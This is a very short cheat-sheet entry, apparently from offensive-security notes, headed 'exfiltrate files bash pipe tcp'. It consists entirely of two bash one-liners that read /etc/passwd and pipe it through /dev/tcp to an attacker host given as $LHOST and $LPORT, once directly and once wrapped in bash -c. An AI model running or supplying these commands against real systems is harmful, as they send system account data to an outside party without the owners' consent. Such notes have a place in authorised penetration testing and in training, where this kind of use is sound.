## exfiltrate files bash pipe tcp
```bash
cat /etc/passwd > /dev/tcp/$LHOST/$LPORT
bash -c "cat /etc/passwd > /dev/tcp/$LHOST/$LPORT"
```

